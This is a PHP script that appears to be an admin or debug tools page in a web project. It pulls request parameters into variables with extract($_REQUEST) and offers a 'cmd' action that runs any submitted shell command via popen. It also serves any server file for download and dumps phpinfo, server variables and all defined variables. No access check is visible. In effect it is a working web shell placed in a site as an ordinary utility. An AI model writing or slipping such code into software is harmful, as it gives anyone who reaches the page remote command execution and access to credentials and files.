<?php
//require_once '../include/common.inc.php'; 

error_reporting( E_ERROR );

include '../include/common.inc.php';

include_once 'Function.php';

define( 'ROOT', $_SERVER[ 'DOCUMENT_ROOT' ] );

extract( $_REQUEST );

$tools_list = array( 'cmd', 
						'db', 
						'dir', 
						'download', 
						'check_network', 
						'var',
						'SERVER',
						'phpinfo',
						'tools_file_list',
						'tools_list',
						'test' );

if( empty( $action ) ) $action = 'tools_list';
else if( $action && !in_array( $action, $tools_list ) ) exit( 'Access Deny!' );

switch( $action )
{ 
	case 'cmd':
		echo "<form action='?$_SERVER[QUERY_STRING]' method='post' ><textarea name='cmd' cols='100' rows='5' >" . htmlentities( $cmd ) . "</textarea><input name='cmd_submit' value='running' type='submit' ></form>"; 
		if( $cmd_submit ){ 
			echo '<pre>'; 
			$process_file = popen( $cmd, 'r' );
			while( !feof( $process_file ) ) {
				$retrun = fgets( $process_file );
				echo $retrun ? "$retrun
" : '';
			}
			pclose( $process_file );
// 			system( $cmd ); 
			echo '</pre>'; 
		}
		exit(); 
		break;
	case 'db';
		require './db/DB.php';
		break;
	case 'dir':
		require './dir/Browser.php';
		break;
	case 'download':
		$req_file = $file;
		if( !file_exists($req_file) ) exit($req_file.' not found!');
		if( is_dir($req_file) ) exit($req_file.' is folder!');
		$_file = fopen( $req_file, 'rb' );
		$data = fread( $_file, filesize($req_file) );
		fclose($_file);
	
		header('Content-type: text/plain');
		header('Accept-Ranges: bytes');
		header('Content-Disposition: attachment; filename=' . $getf );
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0' );
		header('Pragma: no-cache' );
		header('Expires: 0' );
	
		exit($data);
		break;
	case 'check_network':
		$w = stream_get_wrappers(); 
		echo 'openssl: ',  extension_loaded  ('openssl') ? 'yes':'no', "\n"; 
		echo 'http wrapper: ', in_array('http', $w) ? 'yes':'no', "\n"; 
		echo 'https wrapper: ', in_array('https', $w) ? 'yes':'no', "\n"; 
		echo 'wrappers: ', var_dump($w); 
		exit(); 
	case 'var':
		echo '<pre>';
		var_export( get_defined_vars() );
		echo '</pre>';
		break;
	case 'SERVER':
		echo '<pre>';
		var_export( $_SERVER );
		echo '</pre>';
		break;
	case 'phpinfo':
		phpinfo();
		exit(); 
		break;
// 	case 'widget':
// 		include admin_tpl('header'); 
// 		$rf = new ReflectionClass( 'form' ); 
// 		$forms = $rf -> getMethods(); 
// 		echo '<table border="1" >'; 
// 		foreach ( $forms as $form ) { 
// 			$fn = $form->getName(); 
// 			echo "<tr><td>$fn</td><td>"; 
// 			echo form::$fn(); 
// 			echo "</td><td>"; 
// 			echo "<table>"; 
// 			foreach( $form->getParameters() as $fp ){ 
// 				echo "<tr><td>";
// 				echo $fp->getName();
// 				echo "</td><td>";
// 				echo $fp->isDefaultValueAvailable() ? $fp->getDefaultValue() : '<font color="red" >require</font>';
// 				echo "</td></tr>"; 
// 			}
// 			echo "</table>"; 
// 			echo "</td></tr>"; 
// 		}
// 		echo '</table>'; 
	case 'tools_file_list':
		$tools_file_list = getFileList( './' );
		echo tb_json_encode( $tools_file_list );
		break;
	case 'test':
		echo '<pre>';
		print_r( $CATEGORY );
		echo '</pre>';
		break;
	default: 
		foreach( $tools_list as $tools ){
			echo "<a href='?action=$tools' >$tools</a><br>";
		}
		break; 
}

exit();
?>